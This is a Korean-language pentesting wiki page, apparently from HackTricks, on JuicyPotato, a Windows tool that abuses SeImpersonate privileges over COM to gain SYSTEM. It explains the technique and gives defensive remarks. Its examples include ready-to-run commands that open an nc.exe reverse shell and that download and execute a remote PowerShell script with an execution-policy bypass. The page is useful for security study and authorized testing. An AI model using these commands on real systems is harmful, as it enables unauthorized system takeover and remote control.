# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato는** Windows Server 2019 및 Windows 10 빌드 1809 이상에서 **작동하지 않습니다. 그러나** [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)를 사용하여 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM`** 수준의 액세스를 얻을 수 있습니다. _**확인:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (황금 권한 남용) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_조금의 주스를 더한_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, 즉 **Windows 서비스 계정에서 NT AUTHORITY\SYSTEM으로의 또 다른 로컬 권한 상승 도구**_

#### juicypotato는 [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)에서 다운로드할 수 있습니다.

### 요약 <a href="#summary" id="summary"></a>

[**juicy-potato Readme에서**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) 및 그 [변형들](https://github.com/decoder-it/lonelypotato)은 [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [서비스](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)를 기반으로 한 권한 상승 체인을 활용하며, `127.0.0.1:6666`에서 MiTM 리스너를 가지고 있고, `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한이 있을 때 작동합니다. Windows 빌드 검토 중에 `BITS`가 의도적으로 비활성화되고 포트 `6666`이 사용 중인 설정을 발견했습니다.

우리는 [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)를 무기화하기로 결정했습니다: **Juicy Potato에 인사하세요**.

> 이론에 대해서는 [Rotten Potato - 서비스 계정에서 SYSTEM으로의 권한 상승](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)을 참조하고 링크와 참조의 체인을 따라가세요.

우리는 `BITS` 외에도 남용할 수 있는 여러 COM 서버가 있다는 것을 발견했습니다. 이들은 다음을 충족해야 합니다:

1. 현재 사용자에 의해 인스턴스화 가능해야 하며, 일반적으로는 임시 권한이 있는 “서비스 사용자”입니다.
2. `IMarshal` 인터페이스를 구현해야 합니다.
3. 상승된 사용자(SYSTEM, Administrator 등)로 실행되어야 합니다.

몇 가지 테스트 후, 여러 Windows 버전에서 [흥미로운 CLSID 목록](http://ohpe.it/juicy-potato/CLSID/)을 얻고 테스트했습니다.

### Juicy 세부사항 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato를 사용하면:

- **대상 CLSID** _원하는 CLSID를 선택하세요._ [_여기_](http://ohpe.it/juicy-potato/CLSID/) _에서 OS별로 정리된 목록을 찾을 수 있습니다._
- **COM 리스닝 포트** _선호하는 COM 리스닝 포트를 정의하세요 (하드코딩된 6666 대신)_
- **COM 리스닝 IP 주소** _서버를 원하는 IP에 바인딩하세요_
- **프로세스 생성 모드** _임시 사용자 권한에 따라 선택할 수 있습니다:_
- `CreateProcessWithToken` (필요: `SeImpersonate`)
- `CreateProcessAsUser` (필요: `SeAssignPrimaryToken`)
- `둘 다`
- **실행할 프로세스** _익스플로잇이 성공하면 실행할 실행 파일 또는 스크립트_
- **프로세스 인수** _실행된 프로세스 인수를 사용자 정의하세요_
- **RPC 서버 주소** _은밀한 접근을 위해 외부 RPC 서버에 인증할 수 있습니다_
- **RPC 서버 포트** _외부 서버에 인증하고 방화벽이 포트 `135`를 차단하는 경우 유용합니다…_
- **테스트 모드** _주로 테스트 목적으로, 즉 CLSID 테스트. DCOM을 생성하고 토큰의 사용자를 출력합니다. _[_테스트용 여기_](http://ohpe.it/juicy-potato/Test/)
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 최종 생각 <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potato Readme에서**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

사용자가 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 가지고 있다면, 당신은 **SYSTEM**입니다.

이 모든 COM 서버의 남용을 방지하는 것은 거의 불가능합니다. `DCOMCNFG`를 통해 이러한 객체의 권한을 수정하는 것을 고려할 수 있지만, 행운을 빕니다. 이는 도전적일 것입니다.

실제 해결책은 `* SERVICE` 계정으로 실행되는 민감한 계정과 애플리케이션을 보호하는 것입니다. `DCOM`을 중지하면 이 익스플로잇을 확실히 억제할 수 있지만, 기본 OS에 심각한 영향을 미칠 수 있습니다.

출처: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 예시

참고: 시도할 CLSID 목록은 [이 페이지](https://ohpe.it/juicy-potato/CLSID/)를 방문하세요.

### nc.exe 리버스 셸 얻기
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 새로운 CMD 실행 (RDP 접근 권한이 있는 경우)

![](<../../images/image (300).png>)

## CLSID 문제

대부분의 경우, JuicyPotato가 사용하는 기본 CLSID는 **작동하지 않으며** 익스플로잇이 실패합니다. 일반적으로 **작동하는 CLSID**를 찾기 위해 여러 번 시도해야 합니다. 특정 운영 체제에 대해 시도할 CLSID 목록을 얻으려면 이 페이지를 방문해야 합니다:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSID 확인**

먼저, juicypotato.exe 외에 몇 가지 실행 파일이 필요합니다.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)를 다운로드하고 PS 세션에 로드한 후, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)을 다운로드하여 실행합니다. 이 스크립트는 테스트할 수 있는 CLSID 목록을 생성합니다.

그런 다음 [test_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(CLSID 목록과 juicypotato 실행 파일의 경로를 변경) 을 다운로드하고 실행합니다. 이 스크립트는 모든 CLSID를 시도하기 시작하며, **포트 번호가 변경되면 CLSID가 작동했음을 의미합니다**.

**-c 매개변수를 사용하여** 작동하는 CLSID를 **확인하십시오.**

## 참고 문헌

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
